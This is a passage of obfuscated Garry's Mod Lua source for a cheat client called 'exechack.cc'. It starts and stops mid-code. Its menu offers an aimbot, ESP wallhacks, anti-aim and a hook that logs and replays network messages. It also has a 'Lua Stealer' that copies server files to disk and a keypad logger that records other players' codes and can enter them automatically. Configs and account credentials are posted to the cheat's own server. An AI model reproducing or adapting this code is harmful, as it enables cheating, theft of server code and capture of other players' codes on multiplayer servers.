["WriteBool"]=net.WriteBool,
["WriteColor"]=net.WriteColor,
["WriteData"]=net.WriteData,
["WriteDouble"]=net.WriteDouble,
["WriteEntity"]=net.WriteEntity,
["WriteFloat"]=net.WriteFloat,
["WriteInt"]=net.WriteInt,
["WriteMatrix"]=net.WriteMatrix,
["WriteNormal"]=net.WriteNormal,
["WriteString"]=net.WriteString,
["WriteTable"]=net.WriteTable,
["WriteUInt"]=net.WriteUInt,
["WriteVector"]=net.WriteVector
}
local function c(d,e)
dstring="net."..e.."("
for f=1,#d do dindex=d[f]
if type(dindex)=="number"then 
if f==#d then 
dstring=dstring..dindex
else 
dstring=dstring..dindex..", "
end 
elseif type(dindex)=="boolean"then 
dstring=dstring..tostring(dindex)
elseif type(dindex)=="string"then 
if f==#d then 
dstring=dstring.."\""..dindex.."\""
else 
dstring=dstring.."\""..dindex.."\", "
end 
elseif type(dindex)=="Player"or type(dindex)=="Entity"or type(dindex)=="NPC"then 
dstring=dstring.."Entity("..tostring(dindex:EntIndex())..")"
elseif type(dindex)=="Vector"then 
dstring=dstring.."Vector("..string.gsub(tostring(dindex),"%s+",", ")..")"
elseif type(dindex)=="table"then 
dstring=dstring..table.ToString(dindex)
end 
end;
b=b..dstring..")".."\n"
if string.match(b,"SendToServer")then
local netname="net"
for _,v in pairs(string.Explode("\n",b))do
if string.find(v,"net.Start")then
netname = string.Explode("net.Start",v)[2]:Replace("(",""):Replace(")",""):Replace("'",""):Replace('"',"")
end
end
local ad=util.JSONToTable(file.Read("]]..b.netlogtxt..[[","DATA"))
ad[os.date("%H:%M:%S").." "..netname]=util.Base64Encode(b)
file.Write("]]..b.netlogtxt..[[",util.TableToJSON(ad))
for k, v in pairs(a) do
net[k] = v
end
RunString(b,"lua/includes/modules/menubar.lua")
for h,i in pairs(a)do 
net[h]=shitgay(h)
end
b=""
end 
end;
function shitgay(e)return function(...)c({...},e)end end;
if ]]..b.netloggerenabled..[[==nil then
 for h,i in pairs(a)do 
net[h]=shitgay(h)
end
]]..b.netloggerenabled..[[=true
end
]])end)local c_=vgui.Create("DTextEntry",doplpanel)c_:SetPos(3,30)c_:SetSize(194+50,25)c_:SetText("")c_.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;c_.OnTextChanged=function()if IsValid(cfgtable)then b.netloglist(c_:GetValue())end end;function b.netloglist(dj)if IsValid(cfgtable)then cfgtable:Remove()end;cfgtable=vgui.Create("DScrollPanel",doplpanel)cfgtable:SetPos(3,30+27)cfgtable:SetSize(194+50,100+67-27+30)cfgtable.Paint=function(a8,a9,aa)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)end;local dk=3;for w,x in pairs(util.JSONToTable(file.Read(b.netlogtxt,"DATA")or'[]')or{})do if string.find(string.lower(w),string.lower(dj or"")or"")then a2(w,3,dk,select(1,surface.GetTextSize(w))+10,25,cfgtable,function()a1.exective:SetCode(util.Base64Decode(x))end)dk=dk+27 end end end;b.netloglist("")a2("Refresh",3+84+2,3,58,25,doplpanel,function()b.netloglist("")end)a2("Clear",3+84+2+58+2,3,40,25,doplpanel,function()file.Write(b.netlogtxt,"[]")timer.Simple(1,function()b.netloglist("")end)end)end)end;a1.exective=vgui.Create('lua_executer',di)a1.exective:SetPos(3,24)a1.exective:SetCode("")di.PerformLayout=function(self,G,S)a1.exective:SetSize(G-6,S-54)a1.runscriptloader:SetPos(G-78,S-28)a1.openfileloader:SetPos(3,S-28)a1.lsc:SetPos(43,S-28)a1.obf:SetPos(100,S-28)a1.netlog:SetPos(182,S-28)end;di:Hide()local dq=vgui.Create("DFrame")dq:SetSize(500-34,300)dq:Center()dq:SetTitle("")dq:MakePopup()dq:ShowCloseButton(false)dq.Paint=function(a8,a9,aa)draw.RoundedBox(0,0,0,a9,aa,b.windowbg)draw.RoundedBox(0,0,0,a9,22,b.titlebar)draw.SimpleText("exechack.cc","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,52,a9-6,aa-55)end;local dr=3;local function ds(cI,K,A)a2(K,dr,25,cI,25,dq,A)dr=dr+cI+2 end;ds(57,"Aimbot",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a8,a9,aa)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3+17,150,aa-6-17-60)draw.SimpleText("Main","hack_font_16",6,6+17,b.colortext2)draw.RoundedBox(0,6,23+17,144,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(155,3+17,150,aa-6-17)draw.SimpleText("Target","hack_font_16",158,6+17,b.colortext2)draw.RoundedBox(0,158,23+17,150-6,1,b.border)draw.SimpleText("Accuracy","hack_font_16",310,6+17,b.colortext2)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(307,3+17,150,aa-6-17)draw.RoundedBox(0,310,23+17,150-6,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,184,150,58)draw.SimpleText("Visualization","hack_font_16",6,187,b.colortext2)draw.RoundedBox(0,6,184+20,144,1,b.border)end;au("Enabled","AIM_ENABLED",3,2,tableselect,"Enables the aimbot")au("Silent","AIM_SILENT",6,42,tableselect)au("Auto Fire","AIM_AUTOFIRE",6,42+17*1,tableselect,"Automatatically fires the weapon")au("Auto Reload","AIM_AUTORELOAD",6,42+17*2,tableselect)aL("Key",6,42+17*3,tableselect)aE("Key","AIM_KEY",6,42+17*4,36,tableselect)aI("AutoPistol Key",6,50+17*5,tableselect)aE("Key","MISC_AUTOPISTOL",6,48+17*6,0,tableselect)aL("Fov",158,42,tableselect)local dt=vgui.Create("DPanel",tableselect)dt:SetPos(158-6,42+17*1-7)dt:SetSize(270,30)dt.Paint=function()end;an(dt,0,180,"AIM_FOV",-98,0,250)au("Auto Wall","AIM_AUTOWALL",158,37+17*2,tableselect,"Makes the aimbot aim at people through penetratable surfaces(M9K, TFA)")aI("Priority",158,37+17*3,tableselect)ak(158,37+17*4,"AIM_PRIORITY",{"Closest Distance","Least Health","Field of View"},t["AIM_PRIORITY"],tableselect)au("No Spread","AIM_NOSPREAD",310,42,tableselect,"Engine prediction + CurCone(CommandNumber)")au("No Recoil","AIM_NORECOIL",310,42+17*1,tableselect,"GetPunchAngle")aL("Hitbox",310,42+17*2,tableselect)ak(310,42+17*3,"AIM_HITBOX",{"Head","Body","Hitscan"},t["AIM_HITBOX"],tableselect)aI("Smoothing",310,45+17*4,tableselect)local dt=vgui.Create("DPanel",tableselect)dt:SetPos(310-6,45+17*5-7)dt:SetSize(270,30)dt.Paint=function()end;an(dt,0,15,"AIM_SMOOTHING",-98,0,250)au("Fov Circle","AIM_DRAWFOV",6,206,tableselect)a2("",135,207,15,15,tableselect,function()ab(127,156,function()al("WH_FOV_COLOR",3,3)end)end)au("Snapline","WH_SNAPLINE",6,206+17,tableselect)a2("",135,207+17,15,15,tableselect,function()ab(127,156,function()al("WH_SNAPLINE_COLOR",3,3)end)end)end)ds(50,"Visual",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a8,a9,aa)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,150,aa-6)draw.SimpleText("Player","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,144,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(155,3,150,aa-6)draw.SimpleText("Entity","hack_font_16",158,6,b.colortext2)draw.RoundedBox(0,158,23,150-6,1,b.border)draw.SimpleText("Other","hack_font_16",310,6,b.colortext2)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(307,3,150,aa-6)draw.RoundedBox(0,310,23,150-6,1,b.border)end;a2("",135,6,15,15,tableselect,function()ab(340-90,200,function()an(doplpanel,100,20000,"WH_DISTANCE",-101,-3,250,"Distance")au("Dormant","WH_DORMANT",3,16,doplpanel)surface.SetFont("hack_font_18")local aK=vgui.Create("DButton",doplpanel)aK:SetSize(select(1,surface.GetTextSize("Friend")),15)aK:SetPos(2,32)aK:SetFont("hack_font_18")aK:SetText("Friend")aK:SetTextColor(b.colortext)aK.Paint=function()end;al("WH_FRIENDCOLOR",3,47)local aK=vgui.Create("DButton",doplpanel)aK:SetSize(select(1,surface.GetTextSize("Aim Target")),15)aK:SetPos(125,32)aK:SetFont("hack_font_18")aK:SetText("Aim Target")aK:SetTextColor(b.colortext)aK.Paint=function()end;al("WH_AIMTARGET_COLOR",126,47)end)end)au("Name","WH_NAME",6,25,tableselect,"Show player's name on ESP")a2("",135,26,15,15,tableselect,function()ab(127,178+22-5,function()au("Friend Color","WH_NAME_FRIENDCOLOR",3,2,doplpanel)af(3,20,"WH_NAME_POSITION")al("WH_NAME_COLOR",3,25+22-5)end)end)au("Rank","WH_USERGROUP",6,25+17*1,tableselect,"Show player's rank on ESP")a2("",135,25+17*1+1,15,15,tableselect,function()ab(127,178,function()af(3,3,"WH_USERGROUP_POSITION")al("WH_USERGROUP_COLOR",3,25)end)end)au("Team","WH_JOB",6,25+17*2,tableselect,"Show player's team on ESP")a2("",135,25+17*2+1,15,15,tableselect,function()ab(127,26,function()af(3,3,"WH_JOB_POSITION")end)end)au("Money","WH_MONEY",6,25+17*3,tableselect,"Show player's money(darkrp) on ESP")a2("",135,25+17*3+1,15,15,tableselect,function()ab(127,178,function()af(3,3,"WH_MONEY_POSITION")al("WH_MONEY_COLOR",3,25)end)end)au("Weapon","WH_WEAPON",6,25+17*4,tableselect,"Show player's weapons on ESP")a2("",135,25+17*4+1,15,15,tableselect,function()ab(127,201,function()af(3,3,"WH_WEAPON_POSITION")ak(3,25,"WH_WEAPON_TYPETYPE",{"Only active","All"})al("WH_WEAPON_COLOR",3,47)end)end)au("Health","WH_HEALTH",6,25+17*5,tableselect,"Show player's health ammount on ESP")a2("",135,25+17*5+1,15,15,tableselect,function()ab(127,48,function()af(3,3,"WH_HEALTH_POSITION")ak(3,25,"WH_HEALTH_TYPETYPE",{"Text","Bar","Text + Bar"})end)end)au("Armor","WH_ARMOR",6,25+17*6,tableselect,"Show player's armor ammount on ESP")a2("",135,25+17*6+1,15,15,tableselect,function()ab(127,48-22,function()af(3,3,"WH_ARMOR_POSITION")end)end)au("Box","WH_BOX",6,25+17*7,tableselect,"Draw a bounding box around the player")a2("",135,25+17*7+1,15,15,tableselect,function()ab(127,200-5,function()au("Team Color","WH_BOX_TEAMCOLOR",3,2,doplpanel)ak(3,20,"WH_BOX_TYPETYPE",{"2d","3d","Corner","2d fat","Corner fat"},t["WH_BOX_TYPETYPE"])al("WH_BOX_COLOR",3,42)end)end)au("Chams","WH_CHAMS",6,25+17*8,tableselect,"Applies chams material to the player")a2("",135,25+17*8+1,15,15,tableselect,function()ab(127,200-5,function()au("Team Color","WH_CHAMS_TEAMCOLOR",3,2,doplpanel)ak(3,20,"WH_CHAMS_TYPE",{"XYZ","Textured","Flat","Wireframe"},t["WH_CHAMS_TYPE"])al("WH_CHAMS_COLOR",3,42)end)end)au("Skeleton","WH_SKELETON",6,25+17*9,tableselect,"Draw the player's bone structure")a2("",135,25+17*9+1,15,15,tableselect,function()ab(127,178-5,function()au("Team Color","WH_SKELETON_TEAMCOLOR",3,2,doplpanel)al("WH_SKELETON_COLOR",3,20)end)end)a2("",287,6,15,15,tableselect,function()ab(150,35,function()an(doplpanel,100,20000,"WH_ENTITY_DISTANCE",-101,-3,250,"Distance")au("Dormant","WH_ENTITY_DORMANT",3,27-11,doplpanel)end)end)au("Name","WH_ENTITY_NAME",158,25+17*1-17,tableselect,"Show entity's name on ESP")a2("",287,25+17*1+1-17,15,15,tableselect,function()ab(127,153+3,function()al("WH_ENTITY_NAME_COLOR",3,3)end)end)au("Box","WH_ENTITY_BOX",158,25+17*1,tableselect,"Draw a bounding box around the entity")a2("",287,25+17*1+1,15,15,tableselect,function()ab(127,178,function()ak(3,3,"WH_ENTITY_BOX_TYPE",{"2d","3d"},t["WH_ENTITY_BOX_TYPE"])al("WH_ENTITY_BOX_COLOR",3,25)end)end)au("Chams","WH_ENTITY_CHAMS",158,25+17*2,tableselect,"Applies chams material to the entity")a2("",287,25+17*2+1,15,15,tableselect,function()ab(127,200-22,function()ak(3,3,"WH_ENTITY_CHAMS_TYPE",{"XYZ","Textured","Flat","Wireframe"},t["WH_ENTITY_CHAMS_TYPE"])al("WH_ENTITY_CHAMS_COLOR",3,47-22)end)end)au("CrossHair","CROSSHAIR_ENABLED",310,25+17*1-17,tableselect,"Draw a custom crosshair")a2("",310+129,25+17*1+1-17,15,15,tableselect,function()ab(127,221+27,function()a2("Custom",3,3,66,25,doplpanel,aM)au("CrossHair","CROSSHAIR_CROSSHAIR",3,2+27,doplpanel)au("Circle","CROSSHAIR_FOV",3,2+17+27,doplpanel)au("Box","CROSSHAIR_BOX",3,36+27,doplpanel)an(doplpanel,1,50,"CROSSHAIR_SIZE",-101,48+27,250,"Size")al("CROSSHAIR_COLOR",3,68+27)end)end)au("FullBright","WH_FULLBRIGHT",310,25+17*1,tableselect,"Remove shadows")au("NoSky","WH_NOSKY",310,25+17*2,tableselect,"Change color sky")a2("",310+129,25+17*2+1,15,15,tableselect,function()ab(127,156,function()al("WH_NOSKY_COLOR",3,3)end)end)au("No Sway","NOSWAY",310,25+17*3,tableselect,"Visual no recoil")au("Fov view","WH_FOVVIEW_ENABLED",310,25+17*4,tableselect)a2("",310+129,25+17*4+1,15,15,tableselect,function()ab(150,18,function()an(doplpanel,70,159,"WH_FOVVIEW",-101,-3,250,"Fov")end)end)au("Debug Camera","WH_DEBUGCAMERA_ENABLED",310,25+17*5,tableselect)a2("",310+129,25+17*5+1,15,15,tableselect,function()ab(150,45+15,function()aE("Key","WH_DEBUGCAMERA_KEY",3,3,36,doplpanel)aI("Speed",3,2+27,doplpanel)an(doplpanel,1,10,"WH_DEBUGCAMERA_SPEEDS",-101,24+15,250)end)end)au("ThirdPerson","WH_THIRDPERSON_ENABLED",310,25+17*6,tableselect)a2("",310+129,25+17*6+1,15,15,tableselect,function()ab(150,45+15,function()aE("Key","WH_THIRDPERSON_KEY",3,3,36,doplpanel)aI("Distance",3,2+27,doplpanel)an(doplpanel,70,300,"WH_THIRDPERSON_DISTANCE",-101,24+15,250)end)end)au("Filter","FILTER_ENABLED",310,25+17*7,tableselect)a2("",310+129,25+17*7+1,15,15,tableselect,function()ab(150,46+41,function()aI("Brightness",3,2,doplpanel)an(doplpanel,0,1,"FILTER_BRIGHTNESS",-101,-3+15,250)aI("Contrast",3,2+15+13,doplpanel)an(doplpanel,0,5,"FILTER_CONTRAST",-101,11+15+13,250)aI("Saturation",3,2+15+13+15+13,doplpanel)an(doplpanel,0,5,"FILTER_SATURATION",-101,25+15+13+13,250)end)end)a2("SkyBox",310,25+17*8+1,60,23,tableselect,function()ab(206,200-115,function()local cT=vgui.Create("DTextEntry",doplpanel)cT:SetPos(3,3)cT:SetSize(200,25)cT:SetText("")cT.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;a2("Change",3,3+27,60,25,doplpanel,function()if IsInGame()then p([[
local skybox = GetConVar("sv_skyname"):GetString()
Material("skybox/"..skybox.."lf"):SetTexture("$basetexture",Material("skybox/]]..cT:GetText()..[[lf"):GetTexture("$basetexture"))
Material("skybox/"..skybox.."ft"):SetTexture("$basetexture",Material("skybox/]]..cT:GetText()..[[ft"):GetTexture("$basetexture"))
Material("skybox/"..skybox.."rt"):SetTexture("$basetexture",Material("skybox/]]..cT:GetText()..[[rt"):GetTexture("$basetexture"))
Material("skybox/"..skybox.."bk"):SetTexture("$basetexture",Material("skybox/]]..cT:GetText()..[[bk"):GetTexture("$basetexture"))
Material("skybox/"..skybox.."dn"):SetTexture("$basetexture",Material("skybox/]]..cT:GetText()..[[dn"):GetTexture("$basetexture"))
Material("skybox/"..skybox.."up"):SetTexture("$basetexture",Material("skybox/]]..cT:GetText()..[[up"):GetTexture("$basetexture"))
]])doplpanel:Remove()else notifications("Only in game")end end)a2("Sky List",3,3+27+27,60,25,doplpanel,function()gui.OpenURL("https://developer.valvesoftware.com/wiki/Sky_List")end)end)end)end)ds(41,"Misc",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a8,a9,aa)draw.SimpleText("Movement","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,144,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,150,aa-6)draw.SimpleText("Main","hack_font_16",158,6,b.colortext2)draw.RoundedBox(0,158,23,296,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(155,3,302,aa-6)end;au("Bunny hop","MISC_BUNNYHOP",6,25+17*1-17,tableselect)au("Auto Strafe","MISC_AUTOSTRAFE",6,25+17*1,tableselect)aI("Auto Strafe Mode",6,58,tableselect)ak(6,60+15,"MISC_AUTOSTRAFE_TYPE",{"Legit","Rage"},t["MISC_AUTOSTRAFE_TYPE"],tableselect)aI("Max Hops",6,25+17*2-1+22+15,tableselect)local dt=vgui.Create("DPanel",tableselect)dt:SetPos(0,36+55+20-8)dt:SetSize(270,30)dt.Paint=function()end;an(dt,0,10,"MISC_BUNNYHOP_SAVEHOPS",-98,0,250)aI("Circle Strafe Key",6,25+17*4-1+22+15-8,tableselect)aE("Key","CIRCLESTRAFE_KEY",6,25+17*4+14+22+15-8,0,tableselect)au("Lua Stealer","LUA_FILE_STEALER",158,25+17*1-17,tableselect,"Save server files to dir: ".."C:/exechack",nil,true)au("Afk mode","MISC_ANTIANTIAFK",158,25+17*1,tableselect,"Anti anti-afk")au("Save mode","SAVEMODE",158,25+17*2,tableselect,"Alow load only addons",j)au("Keypad logger","MISC_KEYPADLOGGER",158,25+17*3,tableselect,"no".."t support keypad with secure mode")a2("",287,25+17*3+1,15,15,tableselect,function()ab(171,156+17,function()au("Auto enter password","MISC_KEYPADLOGGER_AUTOENTER",3,2,doplpanel)al("MISC_KEYPADLOGGER_COLOR",3,20)end)end)au("E Spammer","E_SPAMMER",158,25+17*4,tableselect)end)ds(36,"HvH",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DScrollPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(300+160,245)tableselect.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;tableselect.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;tableselect.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;au("Enabled","ANTIAIM_ENABLED",3,2+17*1-17,tableselect)ak(3,2+17*1+1,"ANTIAIM_X",{"Up","Down","Jitter","Emotion","Fake-Down","Fake-Up","Semi-Jitter Down","Semi-Jitter Up","Spinbot"},t["ANTIAIM_X"],tableselect)local dt=vgui.Create("DPanel",tableselect)dt:SetPos(-3,36)dt:SetSize(270,30)dt.Paint=function()end;an(dt,50,100,"ANTIAIM_EMOTION_X",-98,0,250)ak(3,56,"ANTIAIM_Y",{"Forward","Backwards","Jitter","TJitter","Sideways","Emotion","Static"},t["ANTIAIM_Y"])local dt=vgui.Create("DPanel",tableselect)dt:SetPos(-3,72)dt:SetSize(270,30)dt.Paint=function()end;an(dt,20,100,"ANTIAIM_EMOTION_Y",-98,0,250)au("Resolver","RESOLVER",3,91,tableselect)ak(3,92+17,"RESOLVER_X_AXIS",{"Off","Down","Up","Center","Invert","Random","Auto"},t["RESOLVER_X_AXIS"])ak(3,92+17+22,"RESOLVER_Y_AXIS",{"Off","Left","Right","Invert","Random","Auto"},t["RESOLVER_Y_AXIS"])au("Hitsound","HITSOUNDS",3,108+44,tableselect)end)ds(51,"Config",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a8,a9,aa)draw.SimpleText("List","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,448,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,454,aa-6)end;local function aq()surface.SetFont("hack_font_18")if IsValid(cfgtable)then cfgtable:Remove()end;cfgtable=vgui.Create("DScrollPanel",tableselect)cfgtable:SetPos(6,26)cfgtable:SetSize(448,186)cfgtable.Paint=function(a8,a9,aa)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)end;local dk=3;for w,x in pairs(exec_List("C:/exechack")or{})do if not x:find(".lua")and x~="loginandpassword"then local dl=x:Replace(".cfgexec","")a2(dl,3,dk,select(1,surface.GetTextSize(dl))+10,25,cfgtable,function()ab(54,58+27,function()a2("Load",3,3,38,25,doplpanel,function()file.Write(b.maincfg,util.TableToJSON(n(util.JSONToTable(exec_Read("C:/exechack".."/"..x)))))doplpanel:Close()end)a2("Save",3,30,38,25,doplpanel,function()exec_Write("C:/exechack".."/"..x,file.Read(b.maincfg,"DATA"))doplpanel:Close()end)a2("Delete",3,30+27,48,25,doplpanel,function()exec_Delete("C:/exechack".."/"..x)aq()doplpanel:Close()end)end)end)dk=dk+27 end;local du={}http.Post("https://exechack.cc/hacka/account/cfg.php",{a="g",user=username,pass=password},function(a)for h,m in pairs(string.Explode("|",a)or{})do if m==""then else if not du[m]then a2(m,3,dk,select(1,surface.GetTextSize(m))+10,25,cfgtable,function()ab(54,58+27,function()a2("Load",3,3,38,25,doplpanel,function()http.Post("https://exechack.cc/hacka/account/cfg.php",{a="re",user=username,pass=password,name=m},function(a)file.Write(b.maincfg,util.TableToJSON(n(util.JSONToTable(a))))timer.Simple(0.3,function()doplpanel:Close()end)end)end)a2("Save",3,30,38,25,doplpanel,function()http.Post("https://exechack.cc/hacka/account/cfg.php",{a="c",user=username,pass=password,name=m,cfg=file.Read(b.maincfg,"DATA")})end)a2("Delete",3,30+27,48,25,doplpanel,function()http.Post("https://exechack.cc/hacka/account/cfg.php",{a="r",user=username,pass=password,name=m})timer.Simple(0.3,function()aq()doplpanel:Close()end)end)end)end)dk=dk+27;du[m]=true end end end end)end end;a2("Create",6,214,50,25,tableselect,function()ab(200-86,58,function()a2("Save on Disc",3,3,100,25,doplpanel,function()Derma_StringRequest("Config","Name","",function(T)exec_CreateDir("C:/exechack")exec_Write("C:/exechack".."/"..T..".cfgexec",file.Read(b.maincfg,"DATA"))timer.Simple(0.3,function()aq()end)end)end)a2("Save on server",3,30,150-42,25,doplpanel,function()Derma_StringRequest("Config","Name","",function(T)http.Post("https://exechack.cc/hacka/account/cfg.php",{a="c",user=username,pass=password,name=T,cfg=file.Read(b.maincfg,"DATA")})timer.Simple(0.3,function()aq()end)end)end)end)end)a2("Refresh",58,214,58,25,tableselect,aq)local cT=vgui.Create("DTextEntry",tableselect)cT:SetPos(200-82,214)cT:SetSize(200,25)cT:SetText("C:/exechack")cT:SetDisabled(true)cT.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;aq()end)ds(54,"Theme",function()if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DScrollPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(300+160,245)tableselect.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;tableselect.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;tableselect.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;local dv=vgui.Create("DScrollPanel",tableselect)dv:SetPos(0,3)dv:SetSize(300+160-3,245+22-25-3)dv.Paint=function(a8,a9,aa)end;dv.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;dv.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;surface.SetFont("hack_font_18")local aJ=27;local function dw(K,aq)local aK=vgui.Create("DButton",dv)aK:SetSize(select(1,surface.GetTextSize(K))+10,25)aK:SetPos(29,aJ)aK:SetFont("hack_font_18")aK:SetText(K)aK:SetTextColor(b.colortext)aK.Paint=function()end;local d7=vgui.Create("DButton",dv)d7:SetSize(25,25)d7:SetPos(3,aJ)d7:SetText('')d7.Paint=function(S,ad,ae)draw.RoundedBox(0,0,0,ad,ae,t[aq])end;d7.DoClick=function()ab(127,153+3,function()local am=vgui.Create("DColorMixer",doplpanel)am:SetPos(3,25)am:SetSize(121,128)am:SetPalette(false)am:SetWangs(false)am:SetColor(t[aq])am.ValueChanged=function()z(aq,am:GetColor())end;a2("Copy",3,3,41,20,doplpanel,function()b.copycolor=am:GetColor()end)a2("Paste",46,3,44,20,doplpanel,function()if b.copycolor then am:SetColor(b.copycolor)end end)end)end;aJ=aJ+27 end;a2("Reset",3,0,55-10,25,dv,function()z("MENU_STYLE_TEXT",Color(255,255,255))z("MENU_STYLE_TEXT2",Color(200,200,200))z("MENU_STYLE_TITLETEXT",Color(255,255,255))z("MENU_STYLE_TITLEBAR",Color(45,45,45))z("MENU_STYLE_WINDOWBG",Color(35,35,35))z("MENU_STYLE_MENUBARBG",Color(35,35,35))z("MENU_STYLE_BUTTON",Color(35,35,35))z("MENU_STYLE_BUTTONHOVERED",Color(120,120,120,100))z("MENU_STYLE_BORDER",Color(100,100,100))z("MENU_STYLE_SLIDER",Color(255,255,255))z("MENU_STYLE_СHECKBOX",Color(45,45,45))z("MENU_STYLE_СHECKBOXACTIVE",Color(100,100,255))z("MENU_STYLE_TEXTENTRY",Color(25,25,25))end)dw("Text","MENU_STYLE_TEXT")dw("Text2","MENU_STYLE_TEXT2")dw("TitleText","MENU_STYLE_TITLETEXT")dw("TitleBar","MENU_STYLE_TITLEBAR")dw("WindowBg","MENU_STYLE_WINDOWBG")dw("MenuBarBg","MENU_STYLE_MENUBARBG")dw("Button","MENU_STYLE_BUTTON")dw("ButtonHovered","MENU_STYLE_BUTTONHOVERED")dw("Border","MENU_STYLE_BORDER")dw("Slider","MENU_STYLE_SLIDER")dw("CheckBox","MENU_STYLE_СHECKBOX")dw("CheckBoxActive","MENU_STYLE_СHECKBOXACTIVE")dw("TextEntry","MENU_STYLE_TEXTENTRY")end)ds(44,"Fonts",function()local dx=0;if IsValid(tableselect)then tableselect:Remove()end;tableselect=vgui.Create("DPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a8,a9,aa)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(3,3,150,61+16)draw.SimpleText("Player","hack_font_16",6,6,b.colortext2)draw.RoundedBox(0,6,23,144,1,b.border)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(155,3,150,61+16)draw.SimpleText("Entity","hack_font_16",158,6,b.colortext2)draw.RoundedBox(0,158,23,144,1,b.border)if IsInGame()then if CurTime()>dx then local V=t["WH_PLAYER_FONT_OUTLINE"]and"true"or"false"local W=t["WH_ENTITY_FONT_OUTLINE"]and"true"or"false"p([[
surface.CreateFont("fontforplayers",{font="]]..t["WH_PLAYER_FONT"]..[[",size=]]..t["WH_PLAYER_FONT_SIZE"]..[[,shadow=true,outline=]]..V..[[})
surface.CreateFont("fontforentitys",{font="]]..t["WH_ENTITY_FONT"]..[[",size=]]..t["WH_ENTITY_FONT_SIZE"]..[[,shadow=true,outline=]]..W..[[})
]])dx=CurTime()+1.5 end end end;local dy={"Akbar","Coolvetica","Roboto","Arial","Verdana","Courier New","Tahoma","Marlett","ControlBG"}ak(6,26,"WH_PLAYER_FONT",dy,t["WH_PLAYER_FONT"],tableselect)local dt=vgui.Create("DPanel",tableselect)dt:SetPos(0,26+16)dt:SetSize(270,30)dt.Paint=function()end;an(dt,12,40,"WH_PLAYER_FONT_SIZE",-98,0,250,"Size")au("Outline","WH_PLAYER_FONT_OUTLINE",6,26+22+13,tableselect)ak(6+152,26,"WH_ENTITY_FONT",dy,t["WH_ENTITY_FONT"],tableselect)local dt=vgui.Create("DPanel",tableselect)dt:SetPos(152,26+16)dt:SetSize(270,30)dt.Paint=function()end;an(dt,12,40,"WH_ENTITY_FONT_SIZE",-98,0,250,"Size")au("Outline","WH_ENTITY_FONT_OUTLINE",6+152,26+22+13,tableselect)end)ds(63,"Settings",function()if IsValid(tableselect)then 